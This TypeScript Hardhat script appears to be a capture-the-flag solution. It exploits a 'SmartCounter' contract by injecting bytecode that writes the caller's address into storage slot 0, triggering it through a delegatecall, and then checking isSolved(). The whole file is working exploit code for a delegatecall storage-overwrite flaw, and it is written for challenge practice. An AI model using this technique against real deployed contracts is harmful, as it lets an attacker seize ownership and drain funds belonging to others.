import chalk from "chalk";
import { ethers } from "hardhat";
import { SmartCounter__factory } from "../../typechain";

function log(s:string){
    console.log(`${chalk.green("[-] ")+s}`)
}

async function main() {
    const signers = await ethers.getSigners();
    const provider = ethers.provider;
    const network = await provider.getNetwork();
    const deployer = signers[0];
    const attacker = signers[2];

    log(`Running on the ${chalk.yellow(network.name)} network`);
    log(`Attacker address: ${chalk.yellow(attacker.address)}`);
    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await provider.getBalance(attacker)))} ETH`);

    let smartCounterContract;
    let tx;
    if(network.name == "hardhat") {
        smartCounterContract = await new SmartCounter__factory(deployer).deploy(deployer);
        await smartCounterContract.waitForDeployment();
        smartCounterContract = smartCounterContract.connect(attacker);
        log(`Successfully deployed the target contract to address ${chalk.yellow(await smartCounterContract.getAddress())}!`)
    } else if (network.name == "remote") {
        const contractAddress = "0x0000000000000000000000000000000000000000";
        smartCounterContract = SmartCounter__factory.connect(contractAddress, attacker);
        log(`Successfully connected to the target contract with address ${chalk.yellow(await smartCounterContract.getAddress())}!`)
    }

    if(smartCounterContract) {
        // sstore(0, caller())
        // CALLER
        // PUSH1 0x00
        // SSTORE
        let code = "0x33600055";
        tx = await smartCounterContract.create(code);
        await tx.wait();
        log(`Successfully create target contract!`);
        tx = await smartCounterContract.A_delegateccall("0x");
        await tx.wait();
        log(`Is solved: ${await smartCounterContract.isSolved()}`);
    }


}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});